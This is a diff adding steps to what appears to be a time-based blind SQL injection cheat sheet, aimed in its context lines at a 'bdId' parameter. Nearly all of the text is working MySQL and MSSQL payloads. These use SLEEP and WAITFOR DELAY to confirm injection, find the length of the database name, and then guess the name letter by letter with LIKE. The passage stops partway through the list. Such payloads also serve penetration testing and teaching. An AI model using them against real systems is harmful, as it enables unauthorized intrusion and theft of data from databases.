@@ -186,3 +186,24 @@ bdId=BD000001906' IF (SELECT DB_NAME())='master' WAITFOR DELAY '0:0:5'--
 Using Mathematical Operations
 sql
 bdId=BD000001906' IF (1= CASE WHEN DB_NAME()='master' THEN 1 ELSE 0 END) WAITFOR DELAY '0:0:5'-
+
+
+Step-3: (Optional)
+Then enumerate the database length.
+#MySQL Payload
+'%2b(select*from(select(IF(LENGTH(DATABASE())<10,SLEEP(5),FALSE)))a)%2b'
+#MSSQL Payload
+'; IF (LEN(DB_NAME()) < 10) WAITFOR DELAY '00:00:05'--
+Step-4:
+Then match the database length by equal to condition
+#MySQL Payload
+'%2b(select*from(select(IF(LENGTH(DATABASE())=10,SLEEP(5),FALSE)))a)%2b'
+#MSSQL Payload
+'; IF (LEN(DB_NAME()) = 10) WAITFOR DELAY '00:00:05'--
+Step-5:
+Then enumerate the database name using LIKE condition
+#MySQL Payload
+'%2b(select*from(select(IF(DATABASE()%20LIKE%20'a%',SLEEP(5),FALSE)))a)%2b'
+#MSSQL Payload
+'; IF (DB_NAME() LIKE 'a%') WAITFOR DELAY '00:00:10'--
+database name supported characters
